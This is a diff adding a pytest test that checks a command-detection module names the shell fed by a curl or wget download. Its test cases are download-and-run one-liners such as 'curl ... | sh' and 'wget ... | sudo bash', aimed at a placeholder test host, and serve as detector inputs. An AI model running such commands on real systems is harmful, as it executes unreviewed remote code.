@@ -458,6 +458,30 @@ class TestRecursiveShellParsing:
         assert isinstance(result, bool)
 
 
+@pytest.mark.parametrize("extract", ["bashlex", "shlex"])
+@pytest.mark.parametrize(
+    ("cmd", "shells"),
+    [
+        ("curl -fsSL https://x.test/i.sh | sh", {"sh"}),
+        ("wget -qO- https://x.test/i.sh | gunzip | sudo bash", {"bash"}),
+        ("bash <(curl -s https://x.test/i.sh)", {"bash"}),
+        ('bash -c "$(curl -fsSL https://x.test/i.sh)"', {"bash"}),
+        ("sh ./build.sh && curl -s https://x.test/i.sh | zsh", {"zsh"}),
+        ("curl -o i.sh https://x.test/i.sh && sh i.sh", set()),
+        ("curl -s https://x.test/api | jq .", set()),
+        ("echo ls | sh", set()),
+    ],
+)
+def test_shells_fed_by_a_download(extract: str, cmd: str, shells: set[str]) -> None:
+    """Both parsers name the shell whose script is a curl/wget download."""
+    from autorun import command_detection
+
+    if extract == "bashlex":
+        assert command_detection.shells_running_downloads(cmd) == shells
+    else:
+        assert command_detection._extract_fallback(cmd, 0).fetched_shells == shells
+
+
 # ─── v8: Edge Case Tests ──────────────────────────────────────────────────────
 
 
